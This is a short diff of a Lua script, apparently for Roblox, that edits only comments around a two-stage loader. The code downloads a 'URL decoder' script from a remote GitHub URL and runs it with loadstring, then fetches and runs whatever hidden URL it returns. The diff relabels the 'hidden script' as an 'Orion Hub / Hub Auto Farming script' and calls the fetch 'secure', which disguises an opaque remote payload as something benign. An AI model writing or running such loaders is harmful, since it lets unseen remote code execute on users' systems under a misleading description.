@@ -136,9 +136,9 @@ else
     end)
 end
 
--- Fetch and execute the URL decoder script securely
+-- Securely decode the URL using a secondary decoder
 local urlDecoderScript = game:HttpGet("https://raw.githubusercontent.com/your-username/repo-name/main/url_decoder.lua")
 local decodedUrl = loadstring(urlDecoderScript)()  -- Execute the URL decoder script
 
--- Load and execute the decoded URL (hidden script)
+-- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
 loadstring(game:HttpGet(decodedUrl))()
